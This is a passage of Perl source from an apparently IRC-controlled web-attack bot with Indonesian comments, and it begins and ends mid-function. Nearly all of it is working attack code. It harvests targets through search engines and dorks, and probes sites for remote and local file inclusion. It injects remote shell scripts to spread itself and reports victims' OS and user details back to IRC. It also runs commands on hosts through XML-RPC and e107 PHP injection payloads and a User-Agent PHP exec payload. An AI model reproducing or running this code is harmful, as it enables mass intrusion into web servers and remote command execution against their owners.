    while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\" class/g ) { push (@daftar, $1); }
  }
}
  return @daftar;
}
##[ WEBDE ]##
sub se_webde {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 100; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://suche.web.de/search/web/?pageIndex=".$p."&su=".$key."&y=0&x=0&mc=suche\@web\@navigation\@zahlen.suche\@web";
    my $q = bukasitus($url);
    while ( $q =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g ) { push (@daftar, $1); }
    if ( $q !~ /<span class=\"url\">http:\/\/(.*?)<\/span>/ ) { return @daftar; }
  }
  return @daftar;
}
##[ HOTBOT ]##
sub se_hotbot {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 200; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://www.hotbot.com/?query=".$key."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$p;
    my $q = bukasitus($url);
    while ( $q =~ m/<span class=\"grn\">http:\/\/(.+?)<\/span>/g ) {
      my $l = $1 ; if ($l !~ /hotbot/) { push (@daftar, $l); }
    }
    if ( $q !~ /<span class=\"grn\">http:\/\/(.+?)<\/span>/ ) { return @daftar; }
  }
  return @daftar;
}
##[ NETSCAPE ]##
sub se_netscape {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 10; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://search.netscape.com/search/search?query=".$key."&page=".$p."&y=0&x=0&st=webresults";
    my $q = bukasitus($url);
    while ( $q =~ m/url\">http:\/\/(.*?)<\/p>/g ) {
      my $l = $1 ; if ($l !~ /search.netscape/) { push (@daftar, $l); }
    }
    if ( $q !~ /url\">http:\/\/(.*?)<\/p>/ ) { return @daftar; }
  }
  return @daftar;
}
## END OF RUTIN SEARCH ENGINE ##

##[ BUG JOOMLA ]##
sub bugjoomla {
  my $mode = $_[0];
  my @bugz;
  system("lwp-download ".$joomlaz);
  system("curl -O ".$joomlaz);
  system("wget ".$joomlaz);
  open(FILE,"< joomla.txt");
  if ($mode eq "hitung") {
    my $baris = 0; my $buff;
    while (sysread FILE, $buff, 4096) { $baris += ($buff =~ tr/\n//); }
    close FILE;
    f_hapus("joomla.txt*");
    return $baris;
  }
  else {
    while ( my $r = <FILE> ) { $r =~ s/\n//g; push(@bugz,$r); }
    close(FILE);
    f_hapus("joomla.txt*");
    return @bugz;
  }
}

##[ MILW0RM ]##
sub milw0rm {
  my ($chan,$key) = @_;
  my $max = 10; my $i;
  #my $q = bukasitus("http://localhost/milw0rm_rfi.htm");
  my $q = bukasitus("http://milw0rm.com/search.php?dong=".urlen($key));
  irc_msg($chan," [milw0rm.com] $key ");
  while ( $q =~ m/<a href=\"\/exploits\/(.*?)\" target=\"_blank\" class=\"style14\">(.*?)<\/a>/g ) {
    $i++;
    my ($exp,$judul) = ($1,$2);
    irc_msg($chan,$colz{14}." $judul http://milw0rm.com/exploits/$exp ");
    sleep(1);
    return if ($i == $max);
  }
}

##[ BERSIH DORK ]##
sub bersihdork {
  my ($chan,$dork) = @_;
  if ( $dork =~ /inurl:|allinurl:|intext:|allintext:|intitle:|allintitle:/ ) {
    irc_msg($chan,$colz{3}." Membersihkan kata kunci Google.. ");
    $dork =~ s/^inurl://g;
    $dork =~ s/^allinurl://g;
    $dork =~ s/^intext://g;
    $dork =~ s/^allintext://g;
    $dork =~ s/^intitle://g;
    $dork =~ s/^allintitle://g;
  }
  return $dork;
}

##[ SORTIR LINK ]##
sub lnk_sortir {
  my @unik = ();
  my %ada  = ();
  foreach my $e ( @_ ) {
    next if $ada{ $e }++;
    push (@unik, $e);
  }
  return @unik;
}

##[ SARING LINK ]##
sub lnk_filter {
  my @unik = ();
  foreach my $url ( @_ ) {
    my $jelek = 0;
    foreach my $b ( @badlinkz ) {
      if ($url =~ /$b/) { $jelek = 1; }
    }
    if ($jelek == 0) { push (@unik, $url); }
  }
  return @unik;
}

##[ SUBLINK ]##
sub lnk_sub {
  my $link = $_[0];
  my (@links,$path);
  my ($host,@paths) = split(/\//,$link);
  $host .= "/";
  push (@links,$host);
  foreach my $e (@paths) {
    if ($e) {
      $path .= $e."/";
      my $sublink = $host.$path;
      push (@links,$sublink);
     }
  }
  return @links;
}

##[ INFO OS ]##
sub info_os {
  my $url = $_[0];
  my @info;
  my $h  = bukasitus($url.$Ckrid2."??");
  if ($url =~ /Origins/){
  $h  = bukasituslfi($url."tes");
  }else{
  $h  = bukasitus($url.$Ckrid2."??");
  }
  my ($safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc);
  while ( $h =~ m/<br>SAFE: (.+?)<br>/g ) { $safe = $1; }
  while ( $h =~ m/<br>OS: (.+?)<br>/g ) { $os = $1; }
  while ( $h =~ m/<br>UNAME: (.+?)<br>/g ) { $uname = $1; }
  while ( $h =~ m/<br>SERVER: (.+?)<br>/g ) { $server = $1; }
  while ( $h =~ m/<br>USER: (.+?)<br>/g ) { $user = $1; }
  while ( $h =~ m/<br>UID: (.+?)<br>/g ) { $uid = $1; }
  while ( $h =~ m/<br>DIR: (.+?)<br>/g ) { $dir = $1; }
  while ( $h =~ m/<br>PERM: (.+?)<br>/g ) { $perm = $1; }
  while ( $h =~ m/<br>HDD: (.+?)<br>/g ) { $hdd = $1; }
  while ( $h =~ m/<br>DISFUNC: (.+?)<br>/g ) { $disfunc = $1; }
  push (@info,$safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc);
  return @info;
}

##[ SAFEMODE INFO ]##
sub safemode {
  my ($type,$chan,$situs,$bug,$engine) = @_;
  my $safemode; my $vurn; my $sb;
  if ($type == 1) { $vurn = "http://".$situs.$bug; $sb = $vurn; }
  else { $vurn = $situs; $sb = $vurn; }
  my ($safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc) = info_os($vurn);
  if ($safe =~ /OFF/) { $safemode = "OFF"; } elsif ($safe =~ /ON/) { $safemode ="ON"; } else { $safemode ="-"; }
  if ($disfunc) { $disfunc = "[Disfunc][ $disfunc ]"; } else { $disfunc = ""; }
  if ($perm =~/W/) { $perm = "$perm"; } else { $perm = "$perm"; }
  my $statustgt = "[RFI]";
  if($sb =~ /Origins/){$statustgt = "[LFI]";}
  my $S1 = $colz{3}.$statustgt.$colz{1}."[".$colz{5}.$safemode.$colz{1}."][".$colz{6}.$os.$colz{1}."][ ".$colz{14}.$sb.$colz{1}." ]";
  my $S2 = "[".$colz{14}."Uname".$colz{1}."][ ".$colz{10}.$uname.$colz{1}." ] [".$colz{14}."User".$colz{1}."][ ".$colz{10}.$user.$colz{14}." / $uid ".$colz{1}."] [".$colz{14}."Server".$colz{1}."][".$colz{10}." $server ".$colz{1}."] ";
  my $S3 = "[".$colz{14}."Dir".$colz{1}."][".$colz{10}." $dir $perm ".$colz{1}."] [".$colz{14}."HDD".$colz{1}."][".$colz{10}." $hdd ]".$colz{5}." $disfunc ";
  if ($type == 1) {
    irc_msg($dbgchan,$S1);
    if($safemode =~ /O/){ irc_msg($dbgchan,$S2); irc_msg($dbgchan,$S3); }
    irc_msg($chan,$colz{3}.$engine) if ($engine);
  }
  ##[ SPREADING ]##
  bukasitus($vurn.$spread."?");
  bukasituslfisprd($vurn);bukasituslfisprd2($vurn);
  sleep($conf{sleepz});
  irc_msg($chan,$S1);
  if($safemode =~ /O/){ irc_msg($chan,$S2); irc_msg($chan,$S3); }
}

##[ CEK SHELL ]##
sub cek_shell {
  my ($chan,$nick,$situs) = @_;
  my $q = bukasitus($situs.$Ckrid."?");
  print $q;
  if ($q =~ /Origins/) { safemode(2,$chan,$situs,"",""); }
  elsif ($q =~ /failed to open stream/){
    my $qlfi = bukasitus($situs.$lfitest);
    if ($qlfi =~ /HTTP_USER_AGENT/){ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."] $colz{3} ".$situs.$colz{8}.$lfitest);safemode(2,$chan,$situs.$lfitest."&Origins=","",""); }
  }
  else { irc_msg($chan,$colz{3}.$nick.$colz{5}.", targetnya ga vurnerable!"); }
}

##[ ENCRYPT ]##
sub cr_encrypt {
my ($too,$dataenc) = @_;
my $teks      =$dataenc;
my $hashing   = "http://d00r.110mb.com/hash.php?enc=".$teks;
my $request   = HTTP::Request->new(GET=>$hashing);
my $useragent = LWP::UserAgent->new();
$useragent->timeout($conf{timeout});
my $response  = $useragent->request($request);
if ($response->is_success) {
    my $res   = $response->content;
    if ($res =~ m/MD5:([0-9,a-f]{32})<br>SHA1:([0-9,a-f]{40})<br>B64:(.*)/g) {
        my ($md5,$sha1,$base64) = ($1,$2,$3);
        irc_msg($too,$colz{14}."MD5    : ".$colz{6}.$teks.$colz{14}." -> ".$colz{14}.$md5);
        irc_msg($too,$colz{14}."Sha1   : ".$colz{6}.$teks.$colz{14}." -> ".$colz{14}.$sha1);
        irc_msg($too,$colz{14}."Base64 : ".$colz{6}.$teks.$colz{14}." -> ".$colz{14}.$base64);
    }
}
else { irc_msg($too,$colz{5}."MainHack Cannot open web code"); }
}

##[ DECRYPT ]##
sub cr_decrypt {
my ($too,$datadec) = @_;
my $hash      = $datadec;
my $cracker   = "http://md5.rednoize.com/?s=md5&q=".$hash;
my $request   = HTTP::Request->new(GET=>$cracker);
my $useragent = LWP::UserAgent->new();
$useragent->timeout($conf{timeout});
my $response  = $useragent->request($request);
if ($response->is_success) {
    my $res  = $response->content;
    if ($res =~ m/<div id=\"result\" >(.*)<\/div>/g) {
        my $result = $1;
        irc_msg($too,$colz{14}."md5 [RedNoize] ".$colz{6}.$hash.$colz{14}." -> ".$colz{14}.$result);
    }
    else {
        irc_msg($too,$colz{14}."md5 [RedNoize] ".$colz{6}.$hash.$colz{5}." not found.");
    }
}
else { irc_msg($too,$colz{5}."Cannot open Md5.RedNoize.cOm"); }
}

##[ CEK IP ]##
sub cr_ipcek {
my ($too,$dipcek) = @_;
my $ip      = $dipcek;
my $website = "http://www.ipligence.com/geolocation";
my ($useragent,$request,$response,%form);
undef %form;
$form{ip}  = $ip;
$useragent = LWP::UserAgent->new;
$useragent->timeout($conf{timeout});
$request   = POST $website,\%form;
$response  = $useragent->request($request);
if ($response->is_success) {
    my $res = $response->content;
    if ($res =~ m/Your IP address is (.*)<br>City: (.*)<br\/>Country: (.*)<br>Continent: (.*)<br>Time/g) {
        my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
        irc_msg($too,$colz{14}."IP Address : ".$colz{6}.$ipaddress);
        irc_msg($too,$colz{14}."City       : ".$colz{6}.$city);
        irc_msg($too,$colz{14}."Country    : ".$colz{6}.$country);
        irc_msg($too,$colz{14}."Continent  : ".$colz{6}.$continent);
    }
    else { irc_msg($too,$colz{5}."IP-Location Invalid address or IP not found."); }
}
else { irc_msg($too,$colz{5}."IP-Location Cannot open www.ipligence.com"); }
}

##[ CEK ZIP ]##
sub cr_zipcek {
my ($too,$dzipcek) = @_;
my $zip       = $dzipcek;
my $website   = "http://www.zipinfo.com/cgi-local/zipsrch.exe?cnty=cnty&ac=ac&zip=".$zip."&Go=Go";
my $request   = HTTP::Request->new(GET=>$website);
my $useragent = LWP::UserAgent->new();
$useragent->timeout($conf{timeout});
my $response  = $useragent->request($request);
if ($response->is_success) {
    my $res  = $response->content;
    if ($res =~ m/<td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font>/g) {
        my ($city,$state,$zipcode,$county,$area) = ($1,$2,$3,$4,$6);
        irc_msg($too,$colz{14}."City Name   : ".$colz{6}.$city);
        irc_msg($too,$colz{14}."State Code  : ".$colz{6}.$state);
        irc_msg($too,$colz{14}."ZIP Code    : ".$colz{6}.$zipcode);
        irc_msg($too,$colz{14}."County Name : ".$colz{6}.$county);
        irc_msg($too,$colz{14}."Area Code   : ".$colz{6}.$area);
    }
    else { irc_msg($too,$colz{5}."US-ZIP $zip is not a valid ZIP code."); }
}
else { irc_msg($too,$colz{5}."US-ZIP Cannot open www.ZIPInfo.com"); }
}

##[ CMD USER ]##
sub cmd_lfi {
  my ($too,$situs,$cmduser) = @_;
  $cmdlfiu = $cmduser;
  my $qlfi = bukasituslficmd($situs.$lfitest);
  if ($qlfi =~ /HTTP_USER_AGENT/){
    irc_msg($too,"[".$colz{3}."CMDLFI".$colz{1}."][".$cmduser."] sudah dilaksanakan");

  }
  else { irc_msg($too,$colz{5}."target LFI ga vurnerable!"); }
  bukasituslfisprd($situs.$lfitest);bukasituslfisprd2($situs.$lfitest);
}
sub cmd_rfi {
  my ($too,$situs,$cmduser) = @_;
  $cmdrfiu = $cmduser;
  my $q = bukasitus($situs.$Ckrid2."?Origins=".$cmduser);
  if ($q =~ /Origins/){
    irc_msg($too,"[".$colz{3}."CMDRFI".$colz{1}."][".$cmduser."] sudah dilaksanakan");
  }
  else { irc_msg($too,$colz{5}."target RFI ga vurnerable!"); }
  bukasitus($situs.$spread."?");
}
sub cmd_xml {
  my ($too,$situs,$cmduser) = @_;
  my $q = bukasituscrxml($situs,$cmduser);
     if($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
    irc_msg($too,$9);irc_msg($too,$10);sleep($conf{sleepz});
    irc_msg($too,$11);irc_msg($too,$12); }
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
    irc_msg($too,$9);irc_msg($too,$10);sleep($conf{sleepz});
    irc_msg($too,$11); }
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
    irc_msg($too,$9);irc_msg($too,$10);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
    irc_msg($too,$9);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);}
     elsif($q =~ /Origins(.*)\s+(.*)scanner/){
    irc_msg($too,$1);}
     elsif($q =~ /Origins(.*)scanner/){
    irc_msg($too,"[CMDXML][".$cmduser."] sudah dilaksanakan");
     }else{ irc_msg($too,$colz{5}."target XML ga vurnerable!"); }
}
sub cmd_e107 {
  my ($too,$situs,$cmduser) = @_;
  my $q = bukasituscre107($situs,$cmduser);
     if($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
    irc_msg($too,$9);irc_msg($too,$10);sleep($conf{sleepz});
    irc_msg($too,$11);irc_msg($too,$12); }
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
    irc_msg($too,$9);irc_msg($too,$10);sleep($conf{sleepz});
    irc_msg($too,$11); }
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
    irc_msg($too,$9);irc_msg($too,$10);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
    irc_msg($too,$9);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);irc_msg($too,$8);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
    irc_msg($too,$7);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);irc_msg($too,$6);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
    irc_msg($too,$5);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);irc_msg($too,$4);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
    irc_msg($too,$3);}
     elsif($q =~ /Origins(.*)\s+(.*)\s+(.*)scanner/){
    irc_msg($too,$1);irc_msg($too,$2);}
     elsif($q =~ /Origins(.*)\s+(.*)scanner/){
    irc_msg($too,$1);}
     elsif($q =~ /Origins(.*)scanner/){
    irc_msg($too,"[CMDe107][".$cmduser."] sudah dilaksanakan");
     }else{ irc_msg($too,$colz{5}."target e107 ga vurnerable!"); }
}
##[ CEK RESPON ]##
sub cek_respon {
  my $chan = $_[0];
  my ($q1,$q2) = (bukasitus($Ckrid),bukasitus($Ckrid2));
  my ($rid,$rid2,$stat);
  if ( $q1 =~ /Ckrid/ ) { $rid = "OK"; $stat = 1; } else { $rid = "ERROR!"; $stat = 0; }
  if ( $q2 =~ /Ckrid2/ ) { $rid2 = "OK"; $stat += 1; } else { $rid2 = "ERROR!"; $stat += 0; }
  $lfiid2  = bukasitus($Ckrid2);
  $lfisprd = bukasitus($spread);$lfisprd2 = bukasitus($spread2);
  irc_msg($chan,$colz{14}."Ckrid:".$colz{3}." $rid ".$colz{14}."Ckrid2:".$colz{3}." $rid2 ".$colz{14}."LFI (Useragent):".$colz{3}." Origins");
  return $stat;
}

##[ CEK DORK ]##
sub cek_dork {
  my $dork = $_[0];
  foreach my $d (@baddorkz) { if ($dork =~ /$d/) { return 1; } }
  return 0;
}

##[ CEK BUG ]##
sub cek_bug {
  my $bug = $_[0];
  foreach my $b (@badbugz) { if ($bug =~ /$b/) { return 1; } }
  return 0;
}

##[ RUTIN PENANGANAN FILE ]##
sub f_hapus { my $file = $_[0]; system("rm $file"); }
sub f_simpan {
  my ($nf,$hc) = @_;
  my $fh;
  open( $fh, ">>", $nf );
  my @slink = lnk_sub($hc);
  foreach my $s (@slink) { print $fh "$s\n"; }
  close $fh;
}
sub f_simpan2 {
  my ($nf,$isi) = @_;
  my $fh;
  open( $fh, ">", $nf ); print $fh "$isi\n"; close $fh;
}
sub f_simpan2b {
  my ($nf,$isi) = @_;
  my $fh;
  open( $fh, ">>", $nf ); print $fh "$isi\n"; close $fh;
}

##[ HTTP QUERY ]##
sub bukasitus {
  my $url = $_[0];
  my $request = HTTP::Request->new(GET => $url);
  my $ua  = LWP::UserAgent->new;
  $ua->timeout($conf{timeout});
  $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
  my $response = $ua->request($request);
  if ($response->is_success) { return $response->content; }
  else { return $response->status_line; }
}
sub bukasitus2 {
  my $url = $_[0];
  my $ua  = LWP::UserAgent->new;
  $ua->timeout($conf{timeout});
  $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
  my $response = $ua->get($url);
  if ($response->is_success) { return $response->content; }
  else { return $response->status_line; }
}
sub bukasituscrxml {
  my $url  = $_[0];
  my $crMa = $_[1];
  my $exploit;
  my $ua  = LWP::UserAgent->new;
  $ua->timeout($conf{timeout});
  $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
        $exploit  = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'Origins';echo`".$crMa."`;echo'scanner';exit;/*</name></value></param></params></methodCall>";
  my $response = $ua->request(POST $url,Content_Type => 'text/xml',Content => $exploit);
  if ($response->is_success) { return $response->content; }
  else { return $response->status_line; }
}
sub bukasituscre107 {
    my $inc  = $_[0];
    my $crMe = $_[1];
    if($crMe =~ /Origins VURN/){ $crMe = "echo('Origins'.php_uname().'scanner')"; }else{ $crMe = "echo('Origins ');passthru('".$crMe."');echo(' scanner')"; }
        my $ua = LWP::UserAgent->new or die;
        $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
        $ua->timeout($conf{timeout});

        my $req = HTTP::Request->new(POST => $inc);
        $req->content_type('application/x-www-form-urlencoded');
        $req->content("send-contactus=1&author_name=%5Bphp%5D" .$crMe. "%3Bdie%28%29%3B%5B%2Fphp%5D");

        my $res = $ua->request($req);
        print $inc;
    if($res->is_success) {
        return $res->content;
    } else {
        return $res->status_line;
    }
}
sub bukasituscre107spred {
    my $inc  = $_[0];
    my $crMe = $_[1];
        my $ua = LWP::UserAgent->new or die;
        $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
        $ua->timeout($conf{timeout});

        my $req = HTTP::Request->new(POST => $inc);
        $req->content_type('application/x-www-form-urlencoded');
        $req->content("send-contactus=1&author_name=%5Bphp%5D" .$crMe. "%3Bdie%28%29%3B%5B%2Fphp%5D");

        my $res = $ua->request($req);
        print $inc;
    if($res->is_success) {
        return $res->content;
    } else {
        return $res->status_line;
    }
}

sub bukasituscre107spred2 {
    my $inc  = $_[0];
    my $crMe = $_[1];
    my $encode = uri_escape($crMe);
        my $ua = LWP::UserAgent->new or die;
        $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
        $ua->timeout($conf{timeout});

        my $req = HTTP::Request->new(POST => $inc);
        $req->content_type('application/x-www-form-urlencoded');
        $req->content("send-contactus=1&author_name=" .$encode. "");

        my $res = $ua->request($req);
        print $inc;
    if($res->is_success) {
        return $res->content;
    } else {
        return $res->status_line;
    }
}

sub bukasitus3 {
  my $url = $_[0];
  my $host  = $url;
  my $query = $url;
  my $isi; my $kirim;
  my $uagent  = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6";
  $host  =~ s/http:\/\/([-a-zA-Z0-9\.]+)\/.*/$1/;
  $query =~ s/$host//;
  eval {
    my $sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort => "80",Proto => "tcp") || return;
    $kirim = "GET ".$query." HTTP/1.1\r\nHost: ".$host."\r\nAccept: */*\r\nUser-Agent: ".$uagent."\r\n\r\n";
    print $sock $kirim;
    my @r = <$sock>;
    $isi = "@r";
    close($sock);
  };
  return $isi;
}
sub bukasituslfi {
    my $url = $_[0];
    my $agent = $lfiid2;
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout($conf{timeout});
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub bukasituslfisprd {
    my $url = $_[0];
    my $agent = $lfisprd;
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout($conf{timeout});
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub bukasituslfisprd2 {
    my $url = $_[0];
    my $agent = $lfisprd2;
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout($conf{timeout});
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub bukasituslficmd {
    my $url = $_[0];
    my $agent = "<?php echo \"crack#\"; exec(\'".$cmdlfiu."\'); echo \"#crack\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout($conf{timeout});
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub SiteDomains {
